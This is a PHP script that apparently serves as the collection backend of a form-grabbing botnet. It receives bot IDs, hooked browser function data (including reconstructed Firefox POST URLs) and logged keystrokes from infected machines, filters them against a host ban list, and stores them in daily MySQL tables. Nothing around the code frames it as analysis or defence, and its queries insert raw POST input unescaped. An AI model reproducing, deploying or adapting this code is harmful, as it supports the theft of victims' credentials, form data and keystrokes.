<?

//$start_time = microtime(1);

$bot_guid = $_POST['bot_guid'];
if (!isset($bot_guid))
	exit;
	
$process_name = $_POST['process_name'];
$hooked_func = $_POST['hooked_func'];

$func_data = $_POST['func_data'];

// collecting url, if this is FF
if ($hooked_func == 'PR_Write') {
	$match = preg_split("/\r\n/", $func_data, 3);
	if (count($match) > 2) {
		$host = substr($match[1], 6); // 6 symb. - 'Host: '
		$urlp = substr($match[0], 5, (strlen($match[0]) - 9) - 5); // 5 symb. - 'POST ' & 9 symb. - ' HTTP/1.1'
		$url = "http://${host}${urlp}";
		$func_data = $url . '\r\n\r\n' . $func_data;
	}
}

$keys = $_POST['keys'];

include 'mod_file.php';
include 'mod_dbasep.php';

$dbconn = db_open();

// url is banned?
$pos1 = strpos($func_data, "\n");
if ($pos1 !== false) {
	$url = substr($func_data, 0, $pos1);
	//writelog("debug.log", "url : $url");
	$sql = "SELECT host FROM hostban";
	$res = mysql_query($sql);
	if ((@($res)) && mysql_num_rows($res) != 0) {
		while ( list($dbhost) = mysql_fetch_row($res) ) {
			if ( preg_match($dbhost, $url) != 0 ) {
				// skip ...
				//writelog("skip.log", "\n\nfilter 0x00 (url : " . $url . " & " . $dbhost . ")\n\n" . $func_data . "\n\n--------------------------------------------------\n\n");
				db_close($dbase);
				exit;
			}
		}
	}
	db_close($dbase);
}

$date_rep = gmdate('Y.m.d H:i:s');

$tname = 'rep2_' . gmdate('Ymd');

$sql = "INSERT DELAYED INTO $tname VALUES (NULL, '$bot_guid', '$process_name', '$hooked_func', '$func_data', '$keys', '$date_rep')";

mysql_query($sql);
if (mysql_affected_rows() != 1) {

	// creating new table
	$sqlct = " CREATE TABLE IF NOT EXISTS `$tname` ("
		   . " `id` bigint(20) unsigned NOT NULL auto_increment,"
		   . " `bot_guid` varchar(40) NOT NULL,"
		   . " `process_name` varchar(270) NOT NULL,"
		   . " `hooked_func` varchar(100) NOT NULL,"
		   . " `func_data` varchar(10000) NOT NULL,"
		   . " `keys` varchar(10000) character set ucs2 collate ucs2_bin default NULL,"
		   . " `date_rep` datetime NOT NULL,"
		   . " PRIMARY KEY  (`id`)"
		   . " ) ENGINE=MyISAM  DEFAULT CHARSET=cp1251";
	mysql_query($sqlct);
	
	// trying again
	mysql_query($sql);
	if (mysql_affected_rows() != 1) {
		//writelog("error.log", "Wrong query : \" $sql \"");
		writefile("failed.sql", "$sql;");
		db_close($dbconn);
		exit;
	}
		
}

db_close($dbconn);

//$finish_time = microtime(1);
//writelog("queries.log", "$bot_guid (" . ($finish_time - $start_time) . " sec.): \"" . $go . "\""); 

exit;

?>